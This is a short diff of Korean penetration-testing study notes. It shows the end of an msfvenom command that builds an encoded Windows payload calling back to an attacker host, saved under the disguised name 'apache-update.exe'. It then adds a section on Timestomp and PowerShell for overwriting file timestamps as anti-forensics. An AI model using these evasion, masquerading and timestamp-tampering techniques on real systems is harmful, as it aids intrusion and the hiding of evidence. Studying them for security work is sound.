@@ -45,3 +45,8 @@ LHOST= 192.168.44.134 LPORT= 8080 -e x86/shikata_ga_nai \
 - -f exe: 아웃풋 포맷은 exe이다. 
 - -o /root/Desktop/apache-update.exe: 만들어진 페이로드가 저장될 경로이다. 
 
+# Anti-forensics
+## Timestomp 
+- Timestomp 툴을 사용해서 파일의 생성시간, 갱신시간등을 덮어쓰기할 수 있다. 
+- 그런데 윈도우즈에서 파일의 시간데이터를 덮어쓰는 것은 어려운 일일까?
+- [여기](https://tfl09.blogspot.com/2020/12/how-to-change-file-time-for-windows-file.html)를 보면 파워셸로 가능한 것 같다. 
